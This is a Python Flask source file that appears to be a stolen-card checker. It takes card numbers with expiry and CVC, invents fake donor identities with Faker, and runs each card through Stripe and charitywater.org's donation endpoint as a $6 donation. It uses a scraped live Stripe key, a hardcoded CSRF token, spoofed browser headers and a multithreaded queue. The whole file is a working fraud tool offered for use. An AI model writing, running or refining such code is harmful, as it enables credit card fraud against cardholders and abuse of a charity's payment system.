from flask import Flask, request, jsonify
import requests
import threading
from queue import Queue
import re
from faker import Faker

app = Flask(__name__)
faker = Faker()

# Define headers for the first request
headers1 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

# Define headers for the second request
headers2 = {
    'authority': 'www.charitywater.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.charitywater.org',
    'referer': 'https://www.charitywater.org/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-csrf-token': '4KtXpz6X_fnPzzUqtqgnwwW6oX-eHpuLEVBiP397Cx7ySM5vYuWu8ma-nKjWf0HDLJjzN_yUoXjROweqkhw_0g',
    'x-requested-with': 'XMLHttpRequest',
}

# Queue to hold tasks
task_queue = Queue()

# Dictionary to store responses
responses = {}

# Function to process tasks
def process_task():
    while True:
        url, headers, data = task_queue.get()
        if url == 'exit':
            break
        response = requests.post(url, headers=headers, data=data)
        responses[url] = {
            'status_code': response.status_code,
            'content': response.text,
            'json': response.json() if response.headers.get('content-type', '').startswith('application/json') else None
        }
        task_queue.task_done()

# Start multiple threads to handle tasks
num_threads = 10
for _ in range(num_threads):
    threading.Thread(target=process_task, daemon=True).start()

def parse_cc_details(cc_input):
    """Parse credit card input in various formats."""
    # Remove any spaces or special characters
    cc_input = re.sub(r'\s+', '', cc_input)
    
    # Possible formats: CC, CC|MM|YYYY|CVC, CC/MM/YYYY/CVC, CC/MM/YY/CVC
    parts = cc_input.replace('/', '|').split('|')
    
    card_number = parts[0]
    exp_month = '02'  # Default
    exp_year = '2028'  # Default
    cvc = '262'  # Default
    
    if len(parts) >= 4:
        exp_month = parts[1].zfill(2)  # Ensure two digits
        exp_year = parts[2]
        cvc = parts[3]
    
    # Handle two-digit year (e.g., 26 -> 2026)
    if len(exp_year) == 2:
        exp_year = f'20{exp_year}'
    
    return card_number, exp_month, exp_year, cvc

@app.route('/cc=<cc>', methods=['GET', 'POST'])
def handle_payment(cc):
    try:
        print(f"Received request for CC: {cc}")
        
        # Generate fake personal information
        fake_name = faker.name()
        first_name, last_name = fake_name.split(' ', 1) if ' ' in fake_name else (fake_name, '')
        fake_email = faker.email()
        fake_postal_code = faker.postcode()
        
        # Parse credit card details
        card_number, exp_month, exp_year, cvc = parse_cc_details(cc)
        
        # Format data1 with fake data and parsed credit card details
        formatted_data1 = f'type=card&billing_details[address][postal_code]={fake_postal_code}&billing_details[address][city]=&billing_details[address][country]=US&billing_details[address][line1]=&billing_details[email]={fake_email}&billing_details[name]={fake_name.replace(" ", "+")}&card[number]={card_number}&card[cvc]={cvc}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&guid=131456de-f3eb-4cda-ae67-c5d2a523334de8534e&muid=72bcddaf-a5ec-4fcd-a4b2-4a50f3c944553d0a86&sid=ee25a7a4-84e5-46a9-9032-1bb65cd91f65d45f57&payment_user_agent=stripe.js%2Fe7a746c3ca%3B+stripe-js-v3%2Fe7a746c3ca%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=81662&client_attribution_metadata[client_session_id]=ed158115-44d1-4c38-9ea1-e02cff65b3ef&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU'
        
        # First request to Stripe
        url1 = 'https://api.stripe.com/v1/payment_methods'
        r1 = requests.post(url1, headers=headers1, data=formatted_data1)
        
        # Check if Stripe request was successful
        if r1.status_code != 200:
            return jsonify({
                'status': 'error',
                'message': 'Failed to process payment with Stripe',
                'stripe_status_code': r1.status_code,
                'stripe_response': r1.text
            }), r1.status_code
            
        stripe_response = r1.json()
        payment_method_id = stripe_response.get('id')
        
        if not payment_method_id:
            return jsonify({
                'status': 'error',
                'message': 'No payment method ID returned from Stripe',
                'stripe_response': stripe_response
            }), 400
            
        # Format data2 with fake data and payment method ID
        data2 = f'country=us&payment_intent%5Bemail%5D={fake_email}&payment_intent%5Bamount%5D=6&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bmetadata%5D%5Bdonation_kind%5D=water&payment_intent%5Bpayment_method%5D={payment_method_id}&disable_existing_subscription_check=false&donation_form%5Bamount%5D=6&donation_form%5Banonymous%5D=true&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D={fake_email}&donation_form%5Bname%5D={first_name}&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D={last_name}&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bmetadata%5D%5Bdonation_kind%5D=water&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_4516166304006144%5D%5Bexperiment_id%5D=4516166304006144&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_4516166304006144%5D%5Bexperiment_name%5D=(Patch)+Agitated+Donation+Form&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_4516166304006144%5D%5Bvariant_name%5D=Variation+%231&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_5969511162052608%5D%5Bexperiment_id%5D=5969511162052608&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_5969511162052608%5D%5Bexperiment_name%5D=2025+September+Campaign+-+Homepage+Copy+Test&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_5969511162052608%5D%5Bvariant_name%5D=Variation+%231&donation_form%5Bmetadata%5D%5Bemail_consent_granted%5D=true&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2F&donation_form%5Bmetadata%5D%5Bphone_number%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Buk_eu_ip%5D=false&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bsession_url_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false&donation_form%5Baddress%5D%5Baddress_line_1%5D=&donation_form%5Baddress%5D%5Baddress_line_2%5D=&donation_form%5Baddress%5D%5Bcity%5D=&donation_form%5Baddress%5D%5Bcountry%5D=&donation_form%5Baddress%5D%5Bzip%5D='
        
        # Second request to Charity Water
        url2 = 'https://www.charitywater.org/donate/stripe'
        task_queue.put((url2, headers2, data2))
        
        # Wait for the task to be processed
        while url2 not in responses:
            pass
        
        # Prepare response
        response_data = {
            'status': 'success',
            'message': 'Payment processed successfully',
            'data': {
                'stripe_payment_method_id': payment_method_id,
                'generated_info': {
                    'name': fake_name,
                    'email': fake_email,
                    'postal_code': fake_postal_code
                },
                'stripe_response': {
                    'status_code': r1.status_code,
                    'response': stripe_response
                },
                'charity_water_response': responses.get(url2, {})
            }
        }
        
        # Clean up responses
        responses.pop(url2, None)
        
        return jsonify(response_data), 200
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Error processing payment: {str(e)}',
            'data': {}
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
